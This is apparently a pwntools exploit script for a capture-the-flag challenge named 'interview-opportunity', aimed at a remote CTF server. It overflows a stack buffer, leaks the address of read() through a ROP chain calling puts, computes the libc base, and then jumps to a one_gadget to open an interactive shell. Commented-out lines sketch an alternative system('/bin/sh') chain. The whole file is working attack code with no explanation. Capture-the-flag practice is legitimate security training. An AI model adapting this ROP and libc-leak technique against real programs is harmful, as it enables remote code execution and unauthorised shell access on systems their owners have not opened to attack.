from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("mc.ax", 31081)
# p = process("./interview-opportunity")
e = ELF("./interview-opportunity")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")
# gdb.attach(p)
pop_rdi = 0x0000000000401313
pop_rsi_r15 = 0x0000000000401311
ret2main = 0x0000000000401240
justret = 0x000000000040101a
# [3] Get offset of system
# libc = ELF("./libc.so.6")

read_got = e.got["read"]
read_plt = e.plt["read"]
puts_plt = e.plt["puts"]

buf2ret = 10+0x18

payload = b"A"*buf2ret
# for get read() address - exploit : puts() call
# payload += p64(justret)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt) # puts(read_got) read() address print not call read()
payload += p64(e.symbols["main"])

p.recvuntil("Why should you join DiceGang?")
p.send(payload)

p.recvn(47)
tmp=p.recvn(6)
read_addr = u64(tmp+b"\x00"*2)
slog("read()", read_addr)

libc_base = read_addr - libc.symbols["read"]
slog("lb", libc_base)

og = 0xcbd20
og_addr = libc_base + og
slog("one_gadget", og_addr)

system_addr = libc_base + libc.symbols["system"]
slog("system_addr", system_addr)

payload = b"A"*buf2ret
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(og_addr)
# We can read only 0x46
# read("/bin/sh") == system("/bin/sh")
# read(0, [read_got], 0x10)
# payload += p64(justret)
# payload += p64(pop_rdi)
# payload += p64(0)
# payload += p64(pop_rsi_r15)
# payload += p64(read_got) + p64(0)
# payload += p64(read_plt)
# # read input is uhm...

# # system("/bin/sh")
# # payload += p64(justret)
# payload += p64(pop_rdi)
# payload += p64(read_got+0x8) #"/bin/sh"
# payload += p64(read_plt) #[read_got] == system()

p.recvuntil("Why should you join DiceGang?")
p.send(payload)

# p.send(p64(system_addr)+b"/bin/sh\x00")
p.interactive()